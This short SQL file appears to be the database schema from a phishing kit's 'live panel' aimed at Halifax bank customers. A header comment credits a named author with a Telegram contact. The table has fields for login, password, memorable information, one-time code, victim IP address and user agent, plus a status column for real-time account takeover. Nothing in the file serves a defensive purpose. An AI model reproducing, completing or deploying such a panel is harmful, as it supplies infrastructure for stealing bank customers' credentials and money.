
/*LIVE PANEL MADE BY PRSKORUM  halifax     Prskorum  telegram*/


CREATE TABLE hali(
login varchar(255),
pass varchar(255),
memo varchar(255),
code varchar(255),
buzz varchar(255),
ip varchar(255),
agent varchar(255),
status varchar(255));